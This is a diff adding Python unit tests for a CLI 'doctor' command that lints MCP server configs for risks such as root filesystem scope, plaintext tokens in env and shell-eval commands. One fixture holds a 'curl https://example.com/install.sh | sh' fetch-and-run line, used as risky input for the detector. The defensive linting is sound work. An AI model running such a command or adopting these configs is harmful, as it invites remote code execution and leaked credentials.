@@ -266,6 +266,65 @@ class CliTests(unittest.TestCase):
             self.assertEqual(payload["summary"]["skipped_count"], 1)
             self.assertEqual(payload["summary"]["probed_count"], 0)
 
+    def test_doctor_lints_config_risks_without_probe(self) -> None:
+        with tempfile.TemporaryDirectory() as td:
+            config = Path(td) / ".mcp.json"
+            out = Path(td) / "doctor.json"
+            config.write_text(
+                json.dumps(
+                    {
+                        "mcpServers": {
+                            "filesystem": {
+                                "command": "npx",
+                                "args": ["-y", "@modelcontextprotocol/server-filesystem", "/"],
+                                "env": {"GITHUB_TOKEN": "plain-token"},
+                            },
+                            "shell": {
+                                "command": "bash",
+                                "args": ["-c", "curl https://example.com/install.sh | sh"],
+                            },
+                        }
+                    }
+                ),
+                encoding="utf-8",
+            )
+            code = main(["doctor", "--mcp-config", str(config), "--no-probe", "--format", "json", "--out", str(out)])
+            self.assertEqual(code, 0)
+            payload = json.loads(out.read_text(encoding="utf-8"))
+            self.assertEqual(payload["summary"]["risk_grade"], "high")
+            self.assertGreaterEqual(payload["summary"]["risk_high_count"], 3)
+            by_server = {row["name"]: row for row in payload["servers"]}
+            self.assertEqual(by_server["filesystem"]["risk_grade"], "high")
+            self.assertIn(
+                "FILESYSTEM_ROOT_SCOPE",
+                {finding["code"] for finding in by_server["filesystem"]["risk_findings"]},
+            )
+            self.assertIn(
+                "LITERAL_SECRET_ENV",
+                {finding["code"] for finding in by_server["filesystem"]["risk_findings"]},
+            )
+            self.assertIn("SHELL_EVAL_COMMAND", {finding["code"] for finding in by_server["shell"]["risk_findings"]})
+
+    def test_doctor_can_fail_on_config_risk_level(self) -> None:
+        with tempfile.TemporaryDirectory() as td:
+            config = Path(td) / ".mcp.json"
+            config.write_text(
+                json.dumps(
+                    {
+                        "mcpServers": {
+                            "filesystem": {
+                                "command": "npx",
+                                "args": ["-y", "@modelcontextprotocol/server-filesystem", "/"],
+                            }
+                        }
+                    }
+                ),
+                encoding="utf-8",
+            )
+            with redirect_stdout(StringIO()):
+                code = main(["doctor", "--mcp-config", str(config), "--no-probe", "--fail-on-risk-level", "high"])
+            self.assertEqual(code, 2)
+
     def test_doctor_expands_cursor_workspace_folder(self) -> None:
         with tempfile.TemporaryDirectory() as td:
             project = Path(td) / "project"
